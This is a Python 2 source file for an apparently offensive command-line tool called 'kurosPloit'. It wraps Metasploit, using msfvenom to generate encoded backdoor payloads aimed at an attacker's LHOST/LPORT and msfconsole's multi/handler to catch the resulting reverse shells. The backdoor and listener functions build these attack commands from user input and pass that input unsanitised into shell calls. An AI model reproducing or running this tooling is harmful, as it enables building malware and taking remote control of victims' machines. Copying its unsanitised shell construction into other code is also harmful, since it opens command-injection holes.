#!/usr/bin/python2
# -*- coding: utf-8 -*-

import sys
import os
from kurosploit import main
from os import popen,system
from plugins import backdoor
from etc import help
from os.path import exists
from etc.colors import bcolors
from etc.banner import cls
from time import sleep
id = popen('whoami').read()
payload = " "
lhost = " "
lport = " "
search = " "
encoder = " "
platform = " "
arch = " "
out = " "
#format = " "

def cls():
    system('clear')

def listener():
    global payload, lhost, lport
    while True:
        try:
            etc = raw_input(bcolors.pink+"┌──<{0}└──╼>kurosPloit".format(id)+bcolors.white+"("+bcolors.blue+"listener"+bcolors.white+")>> "+bcolors.lightcyan).lower()
            if etc == 'show options':
                print"""\033[1;37m
             -------------------------------------------------------------------------------------
             |                                   Options                                         |
             -------------------------------------------------------------------------------------
             |  \033[31mCommand                                      Description \033[1;37m                        |
             |-----------------------------------------------------------------------------------|
             | set payload                     |  payload\033[31m %s \033[1;37m |
             | set lhost                       |  LHOST\033[31m %s \033[1;37m                          |
             | set lport                       |  LPORT\033[31m %s  \033[1;37m                         |
             |-----------------------------------------------------------------------------------|
             | run                             |  start listeners                                |      
             | show options                    |  Show Current Options Of Selected Module        |
             | show payload                    |  show this payloads                             |
             | search <value>                  |  search payloads                                | 
             | back                            |  back                                           |
             | exit                            |  exit the progam                                |
             -------------------------------------------------------------------------------------
""" % (payload,lhost,lport)
                listener()
            elif etc =='show payload':
                help.payloads()
                listener()
            elif 'search' in etc:
                print(bcolors.white+"["+bcolors.blue+"?"+bcolors.white+"]"+bcolors.lightred+" Waiit Search payloads...."+bcolors.white)
                sleep(3)
                search = str(etc).split()[-1]
                system('msfvenom -l payloads | grep "%s"' % (search))
                listener()
            elif etc =='exit':
                print ""+bcolors.green+"Thanks for using kurosPloit"
                exit()
            elif etc == 'back':
                main()
            elif etc =='clear':
                cls()
                listener()
            elif 'set lhost' in etc:
                lhost = etc.split()[-1]
            elif 'set lport' in etc:
                lport = etc.split()[-1]
            elif 'set payload' in etc:
                payload = str(etc.split()[-1])
            elif etc == 'run':
                etc = raw_input(bcolors.white+"["+bcolors.blue+"?"+bcolors.white+"]"+bcolors.green+" Continue Start Listeners(y/n): " )
                if etc =='y':
                    print(bcolors.white+"["+bcolors.blue+"?"+bcolors.white+"]"+bcolors.lightred+" Checking Metasploit-metasploit-framework....")
                    sleep(3)
                    if not exists('/usr/bin/msfconsole'):
                        print(bcolors.white+"\n["+bcolors.red+"!"+bcolors.white+"]"+bcolors.green+" Please install metasploit-framework!!! \n")
                        listener()
                    else:
                        if lhost != " " and lport != " " and payload != " ": 
                            print(bcolors.white+"["+bcolors.blue+"*"+bcolors.white+"]"+bcolors.orange+" metasploit-framework!!!.... "+bcolors.white+"["+bcolors.orange+"OK"+bcolors.white+"]")
                            system('msfconsole -q -x "use exploit/multi/handler; set payload %s ; set lhost %s ; set lport %s ; run"' % (payload,lhost,lport))
                            listener()
                        else:
                            print(bcolors.white+"\n["+bcolors.blue+"?"+bcolors.white+"]"+bcolors.lightred+" Error input!!!....\n")
                            listener()
                else:
                    listener()      
            else:
                print "Wrong Command => ", etc
                print ""+bcolors.white+""+bcolors.blue+"["+bcolors.red+"!"+bcolors.blue+"] "+bcolors.white+"Please enter 'show options'"
                listener()
        except(KeyboardInterrupt):
                print"\n"+bcolors.red+"[*] (Ctrl + C ) Detected, Trying To Exit ...\n" 
                sleep(2)
                print""+bcolors.green+"[*] Thank You For Using KuroSploit =)\n" 
                sleep(3)
                exit()
def malware():
    global payload, lhost, lport, encoder, platform, arch,out, format
    command = "msfvenom"
    while True:
        try:
            etc = raw_input(bcolors.pink+"┌──<{0}└──╼>kurosPloit".format(id)+bcolors.white+"("+bcolors.blue+"backdoor"+bcolors.white+")>> "+bcolors.lightcyan).lower()
            if etc == 'show options':
                print"""\033[1;37m
             -------------------------------------------------------------------------------------
             |                                   Options                                         |
             -------------------------------------------------------------------------------------
             |  \033[31mCommand                                      Description \033[1;37m                        |
             |-----------------------------------------------------------------------------------| 
             | ?                               |  show spesifications                            |   
             | run                             |  start create backdoor                          | 
             | show options                    |  show Current Options Of Selected Module        |
             | show payload                    |  show this payloads                             |
             | show platform                   |  show this platform                             |
             | show encoder                    |  show this encoder                              |
             | search <value>                  |  search payloads                                |
             |-----------------------------------------------------------------------------------|
             | set payload                     |  Set payload options                            |
             | set lhost                       |  set lhost                                      |
             | set lport                       |  set lport                                      |
             | set encoder                     |  set encoder                                    |
             | set platform                    |  set platform                                   |
             | set name                        |  output name                                    |
             |-----------------------------------------------------------------------------------|
             | back                            |  back                                           |
             | exit                            |  exit the progam                                |
             -------------------------------------------------------------------------------------
"""
                malware()
            elif 'search' in etc:
                print(bcolors.white+"["+bcolors.blue+"?"+bcolors.white+"]"+bcolors.lightred+" Waiit Search payloads...."+bcolors.white)
                sleep(3)
                search = str(etc).split()[-1]
                system(command+' -l payloads | grep "%s"' % (search))
                malware()
            elif etc =='?':
                print"""\033[1;37m
    ===========================================
    Payload: \033[31m %s \033[1;37m                  
    LHOST: \033[31m %s \033[1;37m                    
    LPORT: \033[31m %s  \033[1;37m 
    Encoder: \033[31m %s  \033[1;37m
    Platform: \033[31m %s  \033[1;37m                  
    Output name: \033[31m %s  \033[1;37m           
    ===========================================     
""" % (payload, lhost, lport,encoder,platform, out)            
            elif etc =='show format':
                help.format()
                malware()
            elif etc =='show platform':
                help.platform()
                malware()
            elif etc =='show arch':
                help.arch()
                malware()
            elif etc =='show encoder':
                help.enco()
                malware()
            elif etc =='show payload':
                help.payloads()
                malware()
            elif etc =='exit':
                print ""+bcolors.green+"Thanks for using kurosPloit"
                exit()
            elif etc == 'back':
                main()
            elif etc =='clear':
                cls()
                malware()
            elif 'set payload' in etc:
                payload = str(etc.split()[-1])
            elif 'set lhost' in etc:
                lhost = etc.split()[-1]
            elif 'set lport' in etc:
                lport = etc.split()[-1]
            elif 'set encoder' in etc:
                encoder = etc.split()[-1]
            elif 'set arch' in etc:
                arch = etc.split()[-1]
            elif 'set platform' in etc:
                platform = etc.split()[-1]
            elif 'set name' in etc:
                out = etc.split()[-1]
            elif 'set format' in etc:
                format = etc.split()[-1]                
            elif etc == 'run':
                etc = raw_input(bcolors.white+"["+bcolors.blue+"?"+bcolors.white+"]"+bcolors.green+" Continue created backdoors(y/n): " )
                if etc =='y':
                    print(bcolors.white+"["+bcolors.blue+"?"+bcolors.white+"]"+bcolors.lightred+" Checking Metasploit-metasploit-framework....")
                    sleep(3)
                    if not exists('/usr/bin/msfconsole'):
                        print(bcolors.white+"\n["+bcolors.red+"!"+bcolors.white+"]"+bcolors.green+" Please install metasploit-framework!!! \n")
                        malware()
                    else:
                        if arch != " " or lhost != " " or lport != " " or payload != " " or out != " " or encoder !=" " or platform !=" ":
                            print(bcolors.white+"["+bcolors.blue+"INF"+bcolors.white+"]"+bcolors.orange+" metasploit-framework!!!.... "+bcolors.white+"["+bcolors.orange+"OK"+bcolors.white+"]")
                            print(bcolors.white+"["+bcolors.blue+"INF"+bcolors.white+"]"+bcolors.orange+" Running msfvenom!!!..."+bcolors.white+"["+bcolors.orange+"OK"+bcolors.white+"]")  
                            sleep(2)                  
                            print(bcolors.white+"["+bcolors.blue+"INF"+bcolors.white+"]"+bcolors.orange+" use payload"+bcolors.white+"["+bcolors.cyan+"{0}".format(payload)+bcolors.white+"]")
                            sleep(2)
                            print(bcolors.white+"["+bcolors.blue+"INF"+bcolors.white+"]"+bcolors.orange+" use encoder"+bcolors.white+"["+bcolors.cyan+"{0}".format(encoder)+bcolors.white+"]")
                            sleep(2)
                            print(bcolors.white+"["+bcolors.blue+"INF"+bcolors.white+"]"+bcolors.orange+" use platfrom"+bcolors.white+"["+bcolors.cyan+"{0}".format(platform)+bcolors.white+"]")
                            sleep(2)
                            #print(bcolors.white+"["+bcolors.blue+"INF"+bcolors.white+"]"+bcolors.orange+" use Architectures"+bcolors.white+"["+bcolors.cyan+"{0}".format(arch)+bcolors.white+"]")
                            #sleep(2)
                            #print(bcolors.white+"["+bcolors.blue+"INF"+bcolors.white+"]"+bcolors.orange+" Format "+bcolors.white+"["+bcolors.cyan+"{0}".format(formatt)+bcolors.white+"]")
                            print(bcolors.white+"["+bcolors.blue+"!"+bcolors.white+"]"+bcolors.orange+" wait!!!..."+bcolors.white+"["+bcolors.orange+"RUN"+bcolors.white+"]")     
                            backdoor = popen(command+' --platform {0} --arch {1} --encoder {2} -p {3} set lhost={4} set lport={5} -o out/{6} | tee > out/log.txt'.format(platform,arch,encoder,payload,lhost,lport,out)).read()
                            save = open('out/log.txt','w')
                            save.write(backdoor)
                            save.close()
                            sleep(10)
                            print(bcolors.white+"["+bcolors.blue+"*"+bcolors.white+"]"+bcolors.green+"Succses Created backdoor...")
                            cmd = raw_input(bcolors.white+"["+bcolors.blue+"?"+bcolors.white+"]"+bcolors.green+" Continue listener(y/n): " )
                            if cmd == 'y':
                                system('msfconsole -q -x "use exploit/multi/handler; set payload %s ; set lhost %s ; set lport %s ; run"' % (payload,lhost,lport))
                            else:   
                                 malware()                                 
                        else:
                            print(bcolors.white+"\n["+bcolors.blue+"?"+bcolors.white+"]"+bcolors.lightred+" Error input!!!....\n")
                            malware()
                else:
                    malware()      
            else:
                print "Wrong Command => ", etc
                print ""+bcolors.white+""+bcolors.blue+"["+bcolors.red+"!"+bcolors.blue+"] "+bcolors.white+"Please enter 'show options'"
                malware()
        except(KeyboardInterrupt):
                print"\n"+bcolors.red+"[*] (Ctrl + C ) Detected, Trying To Exit ...\n" 
                sleep(2)
                print""+bcolors.green+"[*] Thank You For Using KuroSploit =)\n" 
                sleep(3)
                exit()